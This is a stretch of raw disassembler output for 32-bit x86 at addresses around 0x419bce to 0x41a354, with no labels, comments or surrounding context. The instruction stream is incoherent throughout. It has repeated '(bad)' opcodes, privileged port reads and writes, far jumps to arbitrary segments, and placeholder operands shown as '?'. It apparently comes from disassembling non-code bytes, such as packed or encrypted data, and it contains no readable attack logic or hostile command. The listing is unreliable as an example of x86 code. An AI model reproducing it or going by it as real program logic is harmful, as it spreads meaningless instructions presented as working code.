  419bce:	or     DWORD PTR [ebp+0x68b650af],ebx
  419bd4:	mov    ds:0x2f3f183b,al
  419bd9:	inc    edi
  419bda:	dec    esp
  419bdb:	(bad)  
  419bdc:	adc    eax,ecx
  419bde:	out    0x31,eax
  419be0:	inc    esi
  419be1:	mov    ah,0x54
  419be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419be5:	jbe    0x419be9
  419be7:	test   esp,ebp
  419be9:	xor    BYTE PTR [eax-0x6cbb979b],0x9e
  419bf0:	rcl    DWORD PTR [ecx-0x6ca980f9],0xec
  419bf7:	xchg   ebx,eax
  419bf8:	aas    
  419bf9:	and    eax,0x33fe911d
  419bfe:	jns    0x419c07
  419c00:	sub    bl,al
  419c02:	sbb    DWORD PTR [ecx-0x81b9912],eax
  419c08:	cmc    
  419c09:	mov    eax,0xe14da03e
  419c0e:	or     DWORD PTR [ecx-0x308702f3],edi
  419c14:	mov    dh,0x31
  419c16:	pop    ebp
  419c17:	stc    
  419c18:	jl     0x419c84
  419c1a:	push   0x10c1ef09
  419c1f:	(bad)  
  419c20:	fstp   TBYTE PTR [edi-0x3a]
  419c23:	dec    esi
  419c24:	ins    BYTE PTR es:[edi],dx
  419c25:	dec    esi
  419c26:	leave  
  419c27:	mov    cl,0x84
  419c29:	or     al,0xb6
  419c2b:	pop    edi
  419c2c:	ror    DWORD PTR [eax+0x3528c837],0xf1
  419c33:	cwde   
  419c34:	jne    0x419c68
  419c36:	mov    ebp,0xf55a7684
  419c3b:	adc    DWORD PTR [ebx+0x3a],esp
  419c3e:	jl     0x419c5f
  419c40:	mov    ecx,0xa157e93c
  419c45:	add    ebp,DWORD PTR [si+0x7e]
  419c49:	mov    bh,0x8d
  419c4b:	and    al,0x2b
  419c4d:	rol    bl,1
  419c4f:	ret    0x2e63
  419c52:	mov    ecx,0xa8e3194d
  419c57:	rcr    ecx,cl
  419c59:	xchg   ecx,eax
  419c5a:	ja     0x419cb6
  419c5c:	data16 setnp BYTE PTR [edi+0x70bdc7b8]
  419c64:	(bad)  
  419c65:	mov    ebx,0x83257a6d
  419c6a:	ficomp WORD PTR [ebx]
  419c6c:	xchg   DWORD PTR [ecx],edi
  419c6e:	mov    ah,0xea
  419c70:	(bad)
  419c73:	dec    esi
  419c74:	out    dx,al
  419c75:	pop    ss
  419c76:	nop
  419c77:	stc    
  419c78:	aas    
  419c79:	and    eax,0xcd7f39e9
  419c7e:	jp     0x419cf5
  419c80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c81:	out    0x1f,eax
  419c83:	ret    
  419c84:	int    0xef
  419c86:	rcl    BYTE PTR ds:0x1cc88e16,1
  419c8c:	(bad)  
  419c8d:	sbb    DWORD PTR [ecx+0x46140a5c],ecx
  419c93:	bound  eax,QWORD PTR [esi+0x7a]
  419c96:	outs   dx,DWORD PTR ds:[esi]
  419c97:	inc    edi
  419c98:	add    DWORD PTR [edx+0x6c0e2494],eax
  419c9e:	ins    DWORD PTR es:[edi],dx
  419c9f:	push   cs
  419ca0:	pop    ss
  419ca1:	adc    ch,dl
  419ca3:	mov    ah,0xc2
  419ca5:	adc    BYTE PTR [edx-0x449a9943],0x9c
  419cac:	js     0x419ca0
  419cae:	rcr    esp,cl
  419cb0:	scas   al,BYTE PTR es:[edi]
  419cb1:	add    BYTE PTR [esi+0x21],bh
  419cb4:	dec    edx
  419cb5:	push   es
  419cb6:	popf   
  419cb7:	sbb    bl,BYTE PTR [eax+esi*4]
  419cba:	rol    DWORD PTR [ecx-0x69],cl
  419cbd:	jmp    0x419cf0
  419cbf:	aad    0xb6
  419cc1:	xor    al,al
  419cc3:	sub    eax,0xa25b1bf4
  419cc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cc9:	xor    eax,0xa267dde2
  419cce:	outs   dx,BYTE PTR ds:[esi]
  419ccf:	adc    DWORD PTR [eax+ecx*1],edx
  419cd2:	in     eax,dx
  419cd3:	repnz popa 
  419cd5:	push   ebx
  419cd6:	inc    ebx
  419cd7:	add    DWORD PTR [eax+0x4e],ebx
  419cda:	jmp    0x419d03
  419cdc:	retf   0xe5ec
  419cdf:	push   ebx
  419ce0:	data16 adc cl,BYTE PTR [ecx]
  419ce3:	icebp  
  419ce4:	xchg   BYTE PTR [eax+eiz*4-0x202199a1],al
  419ceb:	cmp    dl,bl
  419ced:	mov    esp,0xd1d65c5f
  419cf2:	lock je 0x419c8a
  419cf5:	loop   0x419d60
  419cf7:	mov    dl,0x49
  419cf9:	adc    al,0xf9
  419cfb:	cmp    eax,0x7101f228
  419d00:	test   DWORD PTR [edi-0x56],esi
  419d03:	cmp    al,0xcc
  419d05:	push   ebx
  419d06:	mov    esp,0xb6435728
  419d0b:	push   esp
  419d0c:	test   al,0x27
  419d0e:	aad    0x8e
  419d10:	pop    ss
  419d11:	cmp    al,0x71
  419d13:	pop    esi
  419d14:	pop    edi
  419d15:	cmp    al,0x1f
  419d17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d18:	inc    BYTE PTR [esi-0x35]
  419d1b:	dec    ebx
  419d1c:	rcr    BYTE PTR [ecx-0x28],1
  419d1f:	ds enter 0x2be8,0xd6
  419d24:	pop    ss
  419d25:	sbb    eax,0xb87a5ad8
  419d2a:	and    al,BYTE PTR [edi]
  419d2c:	aas    
  419d2d:	in     al,0x6b
  419d2f:	repz sub ah,BYTE PTR [ecx+0x44]
  419d33:	adc    eax,0x6aed568e
  419d38:	push   es
  419d39:	(bad)  
  419d3a:	cmp    DWORD PTR [ebp+0x5ac8c84f],ebx
  419d40:	fcomp  st(6)
  419d42:	jbe    0x419cee
  419d44:	push   ds
  419d45:	xor    eax,0xda4d59ac
  419d4a:	push   ebx
  419d4b:	out    0x80,al
  419d4d:	mov    al,0xa1
  419d4f:	xchg   esp,eax
  419d50:	xchg   ebp,eax
  419d51:	xor    al,0x19
  419d53:	jle    0x419d7f
  419d55:	cmp    al,0xcf
  419d57:	fwait
  419d58:	dec    eax
  419d59:	fdiv   QWORD PTR [ebp+edi*2+0x22548550]
  419d60:	jbe    0x419dd1
  419d62:	call   0x6282:0xf0b75e33
  419d69:	mov    ebx,0xa11198e6
  419d6e:	popa   
  419d6f:	dec    edx
  419d70:	inc    ebp
  419d71:	test   al,0x48
  419d73:	mov    dl,0x10
  419d75:	pop    ds
  419d76:	in     al,0x20
  419d78:	dec    ebx
  419d79:	xchg   DWORD PTR [esi+edx*1+0x5c],edi
  419d7d:	cld    
  419d7e:	cmc    
  419d7f:	retf   0x6ea9
  419d82:	jecxz  0x419d77
  419d84:	imul   ebp,DWORD PTR [ebx-0x39d57b8d],0xffffffaf
  419d8b:	dec    ebx
  419d8c:	dec    esp
  419d8d:	pop    eax
  419d8e:	nop
  419d8f:	out    dx,al
  419d90:	enter  0x7d36,0xd7
  419d94:	(bad)  
  419d95:	ficom  WORD PTR fs:[ebp-0x7a]
  419d99:	inc    eax
  419d9a:	mov    ds:0x41beee93,al
  419d9f:	(bad)  
  419da1:	xchg   esp,eax
  419da2:	add    eax,0x4574c1d7
  419da7:	jg     0x419dda
  419da9:	mov    ah,0xbf
  419dab:	adc    DWORD PTR [ebp+0x901219b],edi
  419db1:	je     0x419e05
  419db3:	(bad)  
  419db4:	movups xmm3,xmm3
  419db7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419db8:	ins    BYTE PTR es:[edi],dx
  419db9:	mov    esp,DWORD PTR [esi]
  419dbb:	(bad)  
  419dbc:	cdq    
  419dbd:	out    dx,al
  419dbe:	scas   eax,DWORD PTR es:[edi]
  419dbf:	cld    
  419dc0:	ins    BYTE PTR es:[edi],dx
  419dc1:	mov    ch,BYTE PTR [esi+0x68b3d7ec]
  419dc7:	cld    
  419dc8:	fild   QWORD PTR [ebp-0x49c5c94]
  419dce:	mov    dh,0x12
  419dd0:	or     ah,0x84
  419dd3:	and    DWORD PTR [esi-0x6],esi
  419dd6:	cld    
  419dd7:	push   ss
  419dd8:	call   0xeee8:0xfe330ba5
  419ddf:	mov    al,ds:0x979d8843
  419de4:	rcl    edx,cl
  419de6:	xor    DWORD PTR [ebp+0x3c],ebx
  419de9:	ret    0x64c5
  419dec:	js     0x419de9
  419dee:	xlat   BYTE PTR ds:[ebx]
  419def:	fstp   DWORD PTR [edx-0x19]
  419df2:	cmp    al,0x72
  419df4:	je     0x419d93
  419df6:	cld    
  419df7:	int3   
  419df8:	mov    WORD PTR [ebp-0x7e],?
  419dfb:	pop    ebp
  419dfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dfd:	icebp  
  419dfe:	repnz pop ebp
  419e00:	mov    bh,0xa6
  419e02:	inc    ebx
  419e03:	dec    ebx
  419e04:	adc    al,bl
  419e06:	cli    
  419e07:	dec    esp
  419e08:	not    BYTE PTR [esi+ebx*1-0x2c1385f5]
  419e0f:	ss adc al,0x4f
  419e12:	xor    ebx,DWORD PTR [edx+0x1f]
  419e15:	adc    edi,ebp
  419e17:	adc    ecx,esi
  419e19:	cdq    
  419e1a:	call   0x14d7216c
  419e1f:	inc    esp
  419e20:	dec    esi
  419e21:	pusha  
  419e22:	repnz loop 0x419e1f
  419e25:	push   ecx
  419e26:	mov    ecx,0xa9314023
  419e2b:	push   0x45843c79
  419e30:	sub    DWORD PTR [ecx-0x4d533f6b],esp
  419e36:	mov    al,0x3b
  419e38:	cmp    al,0x3
  419e3a:	sti    
  419e3b:	mov    edi,0x8daec36f
  419e40:	daa    
  419e41:	push   esi
  419e42:	or     bh,BYTE PTR [ebx]
  419e44:	into   
  419e45:	dec    esp
  419e46:	ins    DWORD PTR es:[edi],dx
  419e47:	or     eax,0x34fd108c
  419e4c:	data16 mov bh,0xdd
  419e4f:	outs   dx,BYTE PTR ds:[esi]
  419e50:	retf   0x978a
  419e53:	adc    eax,0xe031729
  419e58:	mov    ds:0xb867b71e,al
  419e5d:	xor    ch,dh
  419e5f:	ins    DWORD PTR es:[edi],dx
  419e60:	and    eax,0x86d44c4b
  419e65:	cli    
  419e66:	mov    dl,bh
  419e68:	ret    0xbe29
  419e6b:	lea    ecx,[edx-0x80]
  419e6e:	cmp    esp,DWORD PTR ds:0x2edbc742
  419e74:	iret   
  419e75:	stc    
  419e76:	icebp  
  419e77:	into   
  419e78:	repnz cwde 
  419e7a:	daa    
  419e7b:	pop    ds
  419e7c:	pusha  
  419e7d:	fidivr DWORD PTR [ebx-0x7e]
  419e80:	icebp  
  419e81:	pop    ebp
  419e82:	sbb    eax,DWORD PTR [ebx]
  419e84:	jmpw   0xb12f
  419e88:	in     al,0x87
  419e8a:	js     0x419e1c
  419e8c:	sub    dl,cl
  419e8e:	pop    ds
  419e8f:	enter  0x3be1,0xad
  419e93:	add    dl,BYTE PTR [eax]
  419e95:	xlat   BYTE PTR ds:[ebx]
  419e96:	pop    edi
  419e97:	out    0x48,al
  419e99:	mov    al,0x9d
  419e9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e9c:	and    al,0x8d
  419e9e:	sub    eax,0x74d2172f
  419ea3:	mul    DWORD PTR [edi]
  419ea5:	jmp    0xfd31:0x303dae67
  419eac:	push   ebp
  419ead:	fist   WORD PTR [edi-0x4ee1b06]
  419eb3:	pop    ds
  419eb4:	xor    dl,BYTE PTR [edi-0x61]
  419eb7:	mov    WORD PTR [ebp-0x3f667b14],?
  419ebd:	sub    al,BYTE PTR [esp+ebx*1+0x210d75c3]
  419ec4:	or     DWORD PTR [edi],ebp
  419ec6:	dec    ebx
  419ec7:	cmp    al,0xe2
  419ec9:	lds    eax,FWORD PTR [ebp-0x2374bcdc]
  419ecf:	popf   
  419ed0:	test   al,0xf5
  419ed2:	outs   dx,DWORD PTR ds:[esi]
  419ed3:	dec    edx
  419ed4:	ss xchg ebp,eax
  419ed6:	mov    dh,0x35
  419ed8:	and    al,0xba
  419eda:	inc    eax
  419edb:	mov    ah,0x43
  419edd:	xchg   edx,eax
  419ede:	push   ebp
  419edf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ee0:	dec    esi
  419ee1:	sbb    eax,ebx
  419ee3:	jns    0x419f52
  419ee5:	test   BYTE PTR [ebx-0x5],dh
  419ee8:	lods   eax,DWORD PTR ds:[esi]
  419ee9:	xchg   esp,eax
  419eea:	inc    edi
  419eeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419eec:	jno    0x419f0a
  419eee:	sbb    al,al
  419ef0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ef1:	adc    al,0x51
  419ef3:	les    esp,FWORD PTR [edx+0x401348f8]
  419ef9:	inc    esp
  419efa:	mov    cl,0x21
  419efc:	stc    
  419efd:	cdq    
  419efe:	sbb    al,0x14
  419f00:	pop    esi
  419f01:	fmul   st,st(7)
  419f03:	dec    esp
  419f04:	imul   esp,DWORD PTR [ecx],0xd
  419f07:	sbb    esi,DWORD PTR [edi-0x789267e7]
  419f0d:	sbb    DWORD PTR [edx-0x59cf958b],ecx
  419f13:	push   ecx
  419f14:	push   cs
  419f15:	sbb    esi,DWORD PTR [eax+0x3c]
  419f18:	enter  0x19b9,0xfa
  419f1c:	clc    
  419f1d:	lods   al,BYTE PTR ds:[esi]
  419f1e:	ficomp WORD PTR cs:[ebp+0x12]
  419f22:	jg     0x419ee9
  419f24:	push   es
  419f25:	es in  eax,0xa
  419f28:	pop    es
  419f29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f2a:	pushf  
  419f2b:	lds    ebp,FWORD PTR [esi]
  419f2d:	cmc    
  419f2e:	int    0x1
  419f30:	mov    al,0x29
  419f32:	mov    bl,0xbc
  419f34:	(bad)  
  419f35:	push   ds
  419f36:	mov    edx,DWORD PTR [ebp+0x1895aecf]
  419f3c:	xor    ecx,DWORD PTR [ebx-0x66b5280a]
  419f42:	mov    ebx,0x3032000c
  419f47:	mov    ah,0x51
  419f49:	leave  
  419f4a:	outs   dx,BYTE PTR ds:[esi]
  419f4b:	leave  
  419f4c:	cmp    cl,0x9b
  419f4f:	xor    DWORD PTR [esi],0x47
  419f52:	in     al,dx
  419f53:	stos   BYTE PTR es:[edi],al
  419f54:	cdq    
  419f55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f56:	pop    es
  419f57:	cmp    bl,dl
  419f59:	int    0x45
  419f5b:	mov    ds:0x7484a36c,al
  419f60:	loope  0x419f91
  419f62:	test   BYTE PTR [edx+0x4d7ea9ee],ah
  419f68:	mov    al,ds:0xdc1f7ed8
  419f6d:	rcl    DWORD PTR [ecx+0x1c],0x79
  419f71:	xchg   esp,esp
  419f73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f74:	in     al,0xe
  419f76:	btr    DWORD PTR [edx-0x38],edi
  419f7a:	inc    edi
  419f7b:	sahf   
  419f7c:	in     al,dx
  419f7d:	and    ebp,DWORD PTR [eax+eax*1+0x4ba23f51]
  419f84:	xor    cl,BYTE PTR [ebp+0xd7b3838]
  419f8a:	ss inc ebp
  419f8c:	shr    DWORD PTR [ebp+0x41],0x51
  419f90:	in     eax,dx
  419f91:	imul   esi,esi,0x5e
  419f94:	xchg   ecx,eax
  419f95:	outs   dx,DWORD PTR ds:[esi]
  419f96:	mov    ah,0xfe
  419f98:	iret   
  419f99:	adc    BYTE PTR [esi],0x5
  419f9c:	and    BYTE PTR [edi],dh
  419f9e:	cmp    eax,0x43d50a51
  419fa3:	add    al,0x8
  419fa5:	add    edx,eax
  419fa7:	in     eax,dx
  419fa8:	push   edi
  419fa9:	out    dx,al
  419faa:	inc    eax
  419fab:	push   ecx
  419fac:	aam    0xdf
  419fae:	xor    eax,0xec0a947
  419fb3:	mov    edi,0xb6510c82
  419fb8:	ss call 0xdd49:0x5710a9ca
  419fc0:	test   al,0xbb
  419fc2:	pop    ecx
  419fc3:	jecxz  0x419fb9
  419fc5:	mov    ah,0x7f
  419fc7:	jmp    0xe2be:0xdd31deca
  419fce:	mov    si,0x23ee
  419fd2:	mov    edx,0xac49ebf1
  419fd7:	ret    
  419fd8:	imul   esp,DWORD PTR [ebx],0x50c555ea
  419fde:	hlt    
  419fdf:	(bad)  
  419fe0:	dec    ebx
  419fe1:	clc    
  419fe2:	push   eax
  419fe3:	pop    eax
  419fe4:	add    eax,0xd069018f
  419fe9:	aam    0x83
  419feb:	cmp    BYTE PTR [esi],0x7a
  419fee:	fcomp  QWORD PTR [edi-0x76]
  419ff1:	sti    
  419ff2:	and    DWORD PTR [ebp-0x70afd0ee],ecx
  419ff8:	arpl   WORD PTR [ebp+edx*8+0x5776dd82],bx
  419fff:	pop    esi
  41a000:	pop    ss
  41a001:	add    dl,ah
  41a003:	rcr    DWORD PTR [ecx*4+0x10202bd8],cl
  41a00a:	pop    ecx
  41a00b:	add    al,BYTE PTR [ebx]
  41a00d:	dec    ecx
  41a00e:	in     al,0x44
  41a010:	pop    ebx
  41a011:	int    0xd9
  41a013:	lea    edx,[edi]
  41a015:	fld    DWORD PTR [edi]
  41a017:	fsubr  QWORD PTR [edi-0xe06d1e3]
  41a01d:	cs neg esi
  41a020:	fdiv   QWORD PTR [esi-0x41]
  41a023:	pop    esp
  41a024:	add    DWORD PTR [eax-0x39],0x6bceff4
  41a02b:	ret    0x63dd
  41a02e:	fcom   QWORD PTR [ebp-0x12db0f64]
  41a034:	jle    0x41a061
  41a036:	push   ebp
  41a037:	popf   
  41a038:	adc    ah,ah
  41a03a:	xor    esp,edi
  41a03c:	jg     0x419fea
  41a03e:	push   esi
  41a03f:	sbb    eax,DWORD PTR [ebx]
  41a041:	std    
  41a042:	cmp    al,0x31
  41a044:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a045:	cwde   
  41a046:	ins    DWORD PTR es:[edi],dx
  41a047:	dec    esp
  41a048:	xchg   ebx,eax
  41a049:	mov    BYTE PTR ds:0x9af93d92,dh
  41a050:	and    BYTE PTR [edi-0x23],ah
  41a053:	sub    BYTE PTR [eax+0x70b166e7],bl
  41a059:	jge    0x41a03f
  41a05b:	lea    esp,[ecx-0x20abaaf6]
  41a061:	outs   dx,DWORD PTR ds:[esi]
  41a062:	test   al,0x27
  41a064:	cmp    BYTE PTR [ebx-0x4d230b9d],al
  41a06a:	cmc    
  41a06b:	inc    esp
  41a06c:	shl    dl,1
  41a06e:	call   0x32237709
  41a073:	shr    ebp,1
  41a075:	out    dx,al
  41a076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a077:	add    DWORD PTR [ebp+0x1e824548],esi
  41a07d:	or     dl,0x85
  41a080:	push   ebx
  41a081:	mov    ds:0xb381fc5a,eax
  41a086:	add    BYTE PTR [esi+ecx*1-0x5f59fb60],cl
  41a08d:	pop    edx
  41a08e:	ror    DWORD PTR [edx+eiz*2-0x1b],0x1f
  41a093:	nop
  41a094:	xor    BYTE PTR [ebp+0x4f],0xe4
  41a098:	mov    bl,0xf8
  41a09a:	je     0x41a0d6
  41a09c:	clc    
  41a09d:	or     eax,0x42204dc2
  41a0a2:	or     DWORD PTR [edi+0x7d],0x5e977ae9
  41a0a9:	push   edx
  41a0aa:	xchg   esp,eax
  41a0ab:	mov    BYTE PTR [esi+0x598826b8],al
  41a0b1:	jo     0x41a0ea
  41a0b3:	or     DWORD PTR [ebx-0x58],edi
  41a0b6:	sub    ecx,esi
  41a0b8:	sub    al,BYTE PTR [ebx+0x2d]
  41a0bb:	add    BYTE PTR [esi+0x7c],bl
  41a0be:	jbe    0x41a0c6
  41a0c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0c1:	and    BYTE PTR [edi+eiz*4-0xd86a8a9],ah
  41a0c8:	mov    ah,0xa5
  41a0ca:	bound  edx,QWORD PTR [ebp+eiz*1+0x31]
  41a0ce:	sbb    al,0x84
  41a0d0:	neg    DWORD PTR ds:0x72b66e6e
  41a0d6:	leave  
  41a0d7:	pop    eax
  41a0d8:	adc    cl,al
  41a0da:	jnp    0x41a11d
  41a0dc:	push   es
  41a0dd:	fwait
  41a0de:	cmc    
  41a0df:	push   es
  41a0e0:	xlat   BYTE PTR ds:[ebx]
  41a0e1:	loopne 0x41a0ad
  41a0e3:	ret    0x728b
  41a0e6:	cmp    edi,eax
  41a0e8:	pop    edx
  41a0e9:	jmp    0x3153:0x540e03df
  41a0f0:	dec    ebp
  41a0f2:	scas   al,BYTE PTR es:[edi]
  41a0f3:	push   ss
  41a0f4:	mov    DWORD PTR [ebp+0xd68127e],ecx
  41a0fa:	ret    0x34bb
  41a0fd:	dec    edx
  41a0fe:	gs pushf 
  41a100:	out    0x1,al
  41a102:	mov    ah,0x6e
  41a104:	push   ebp
  41a105:	in     al,0xa7
  41a107:	and    BYTE PTR [ecx+ebp*8+0x58dc3f66],ch
  41a10e:	mov    esp,0x18cf6715
  41a113:	popf   
  41a114:	xchg   esp,eax
  41a115:	(bad)  
  41a116:	and    DWORD PTR [ebx+0x56],eax
  41a119:	mov    esp,0x8fc79f63
  41a11e:	mov    eax,0xce899595
  41a123:	push   0xb67cb3d5
  41a128:	(bad)  
  41a129:	push   ecx
  41a12a:	sbb    al,0x7
  41a12c:	add    eax,DWORD PTR [esi+0x39]
  41a12f:	int    0xe5
  41a131:	pop    ss
  41a132:	add    ch,BYTE PTR [esi]
  41a134:	add    eax,0x74840b6f
  41a139:	cs jns 0x41a1b9
  41a13c:	clc    
  41a13d:	pop    esi
  41a13e:	mov    BYTE PTR ds:0xf82794cf,dl
  41a144:	loopne 0x41a0dd
  41a146:	rcl    DWORD PTR [esi],cl
  41a148:	aam    0xd9
  41a14a:	jbe    0x41a111
  41a14c:	xchg   DWORD PTR [edx+0x78],ebx
  41a14f:	inc    DWORD PTR [edi-0x54011ba9]
  41a155:	xchg   DWORD PTR [edi],ecx
  41a157:	js     0x41a0dd
  41a159:	lds    eax,FWORD PTR [ebx-0x4234e08d]
  41a15f:	sub    al,0x85
  41a161:	push   0xf55fd168
  41a166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a167:	pop    ss
  41a168:	aam    0x6b
  41a16a:	div    BYTE PTR [ebx]
  41a16c:	and    al,0x7e
  41a16e:	(bad)  
  41a16f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a170:	push   edx
  41a171:	adc    ah,BYTE PTR [edx]
  41a173:	outs   dx,DWORD PTR ds:[esi]
  41a174:	mov    al,ds:0xb4dc55be
  41a179:	in     al,0x3
  41a17b:	pusha  
  41a17c:	mov    dl,0x8d
  41a17e:	stc    
  41a17f:	das    
  41a180:	outs   dx,BYTE PTR ds:[esi]
  41a182:	adc    BYTE PTR [edx+edi*8+0x4400d953],0x3f
  41a18a:	push   ecx
  41a18b:	(bad)  
  41a18c:	test   al,0x87
  41a18e:	lods   al,BYTE PTR ds:[esi]
  41a18f:	mov    ecx,0x8a3e1d60
  41a194:	or     DWORD PTR [ebp-0x301cc9e5],eax
  41a19a:	mov    al,ds:0xc813d2f4
  41a19f:	retf   0x7b4b
  41a1a2:	out    dx,al
  41a1a3:	dec    ebx
  41a1a4:	inc    edi
  41a1a5:	mov    BYTE PTR [ecx],ah
  41a1a7:	inc    edi
  41a1a8:	or     eax,0x16eaae12
  41a1ad:	push   0x6e
  41a1af:	div    DWORD PTR [edi+esi*2]
  41a1b2:	push   ebx
  41a1b3:	(bad)  
  41a1b4:	lods   eax,DWORD PTR ds:[esi]
  41a1b5:	add    dh,BYTE PTR fs:[esi-0x12]
  41a1b9:	stc    
  41a1ba:	lahf   
  41a1bb:	jae    0x41a1e6
  41a1bd:	pop    ecx
  41a1be:	std    
  41a1bf:	push   ds
  41a1c0:	inc    edi
  41a1c1:	xor    BYTE PTR [edi+0x369e5225],al
  41a1c7:	(bad)  
  41a1c8:	in     eax,0x82
  41a1ca:	sbb    ebp,esp
  41a1cc:	pop    es
  41a1cd:	(bad)  
  41a1ce:	icebp  
  41a1cf:	bound  ebp,QWORD PTR ds:0x2347dcdd
  41a1d5:	shr    DWORD PTR [edi],cl
  41a1d7:	mov    bh,0x16
  41a1d9:	mov    eax,ds:0x3e031164
  41a1de:	mov    esi,0x9791ed
  41a1e3:	jg     0x41a18a
  41a1e5:	scas   al,BYTE PTR es:[edi]
  41a1e6:	cs and ch,al
  41a1e9:	pushf  
  41a1ea:	sti    
  41a1eb:	enter  0xab,0x32
  41a1ef:	xchg   ebp,eax
  41a1f0:	pop    dx
  41a1f2:	sbb    DWORD PTR [ebp-0x7a41e31b],esi
  41a1f8:	add    BYTE PTR [edx-0x1c2830f1],0xc0
  41a1ff:	mov    cl,BYTE PTR [esp+ebp*2]
  41a202:	dec    DWORD PTR [esi-0x1ea94f4d]
  41a208:	daa    
  41a209:	add    DWORD PTR ds:0x2bea0587,eax
  41a20f:	inc    eax
  41a210:	shl    edi,1
  41a212:	repnz rcl DWORD PTR [edx],cl
  41a215:	das    
  41a216:	pop    edx
  41a217:	repz mov ebp,0x998326fe
  41a21d:	shl    DWORD PTR [edi+ecx*2-0x1f],0x20
  41a222:	mov    bh,0xeb
  41a224:	ret    0x1d3f
  41a227:	popa   
  41a228:	popa   
  41a229:	lods   al,BYTE PTR ds:[esi]
  41a22a:	mov    BYTE PTR [esi-0x20325e9b],0x9f
  41a231:	sar    DWORD PTR [edx-0x15],cl
  41a234:	cmp    esi,ecx
  41a236:	loope  0x41a2b6
  41a238:	push   0x4cdb9ea5
  41a23d:	les    esp,FWORD PTR [eax-0x4f]
  41a240:	push   edx
  41a241:	or     BYTE PTR [edx-0x56],bl
  41a244:	nop
  41a245:	adc    eax,0x98e9ffc4
  41a24a:	xor    edx,DWORD PTR ds:0xe7119386
  41a250:	ret    0xc060
  41a253:	mov    ds:0xcdc1cc44,al
  41a258:	jns    0x41a220
  41a25a:	pusha  
  41a25b:	iret   
  41a25c:	mov    bh,0x62
  41a25e:	int3   
  41a25f:	addr16 jp 0x41a20f
  41a262:	xchg   ebx,eax
  41a263:	leave  
  41a264:	mov    al,0x33
  41a266:	xor    DWORD PTR [ecx-0x39f12226],0xffffffbd
  41a26d:	add    eax,0xbf7bd33a
  41a272:	bound  edi,QWORD PTR [edx-0x47]
  41a275:	mov    al,ds:0x3121576a
  41a27a:	push   ebp
  41a27b:	stc    
  41a27c:	push   es
  41a27d:	aas    
  41a27e:	xor    eax,0x9b6d1d91
  41a283:	mov    edi,0xab2b0aa6
  41a288:	and    BYTE PTR [esi+0x31ae2f47],0xca
  41a28f:	ins    DWORD PTR es:[edi],dx
  41a290:	and    edi,ecx
  41a292:	xchg   ebx,eax
  41a293:	repz push edi
  41a295:	cmc    
  41a296:	push   ds
  41a297:	scas   al,BYTE PTR es:[edi]
  41a298:	ss mov eax,0xfb422dec
  41a29e:	(bad)  
  41a29f:	jmp    0x41a294
  41a2a1:	cmp    eax,0xcb9fc71f
  41a2a6:	mov    esp,0xd9d1c7a8
  41a2ab:	fbld   TBYTE PTR [esi+0x25]
  41a2ae:	rol    dh,cl
  41a2b0:	stos   BYTE PTR es:[edi],al
  41a2b1:	sub    eax,0xd897d203
  41a2b6:	mov    ch,0xb0
  41a2b8:	dec    ebp
  41a2b9:	dec    DWORD PTR [esi+0x5f]
  41a2bc:	imul   esp,DWORD PTR [edx+0x5b],0xffffff8e
  41a2c0:	or     BYTE PTR [esi-0x48c62ddc],ah
  41a2c6:	jne    0x41a284
  41a2c8:	pusha  
  41a2c9:	ins    BYTE PTR es:[edi],dx
  41a2ca:	jl     0x41a259
  41a2cc:	imul   ecx,DWORD PTR [ebp-0x1355967a],0xffffffab
  41a2d3:	je     0x41a262
  41a2d5:	and    BYTE PTR [eax-0x794ec677],al
  41a2db:	dec    edi
  41a2dc:	jmp    0x54b5e114
  41a2e1:	aad    0x12
  41a2e3:	stos   BYTE PTR es:[edi],al
  41a2e4:	pusha  
  41a2e5:	add    dl,BYTE PTR [ecx]
  41a2e7:	pop    esp
  41a2e8:	call   0xa065ab33
  41a2ed:	mov    dl,0x3c
  41a2ef:	inc    edi
  41a2f0:	mov    bh,0xde
  41a2f2:	mov    ds:0x5cf75820,eax
  41a2f7:	stos   DWORD PTR es:[edi],eax
  41a2f8:	daa    
  41a2f9:	in     al,0xa6
  41a2fb:	pusha  
  41a2fc:	inc    ebp
  41a2fd:	sub    eax,0x5b096e75
  41a302:	xchg   edx,eax
  41a303:	push   0xffffffea
  41a305:	jg     0x41a361
  41a307:	neg    DWORD PTR [esi-0x71]
  41a30a:	hlt    
  41a30b:	push   cs
  41a30c:	loopne 0x41a29b
  41a30e:	dec    esi
  41a30f:	ds cmp dh,0xa4
  41a313:	pop    ecx
  41a314:	std    
  41a315:	xchg   esi,eax
  41a316:	push   0x6bdbb384
  41a31b:	sbb    ebp,DWORD PTR [esi*1+0x65301255]
  41a322:	jmp    0x69163c26
  41a327:	pop    esp
  41a328:	outs   dx,BYTE PTR ds:[esi]
  41a329:	in     eax,0xce
  41a32b:	inc    ebx
  41a32c:	test   ebp,ebx
  41a32e:	lods   eax,DWORD PTR ds:[esi]
  41a32f:	inc    esp
  41a330:	ror    DWORD PTR [ebx],1
  41a332:	mov    edi,eax
  41a334:	into   
  41a335:	push   0xffffff8b
  41a337:	mov    WORD PTR [esi+0x7c],?
  41a33a:	hlt    
  41a33b:	scas   eax,DWORD PTR es:[edi]
  41a33c:	mov    ss,WORD PTR [edx]
  41a33e:	cwde   
  41a33f:	or     ebx,DWORD PTR [eax+0x13]
  41a342:	and    BYTE PTR [ecx],ch
  41a344:	xchg   ecx,eax
  41a345:	popf   
  41a346:	jne    0x41a382
  41a348:	cli    
  41a349:	mov    edi,0x9bbd5b11
  41a34e:	fisubr WORD PTR [ecx-0x1d8de3a4]
  41a354:	aas    
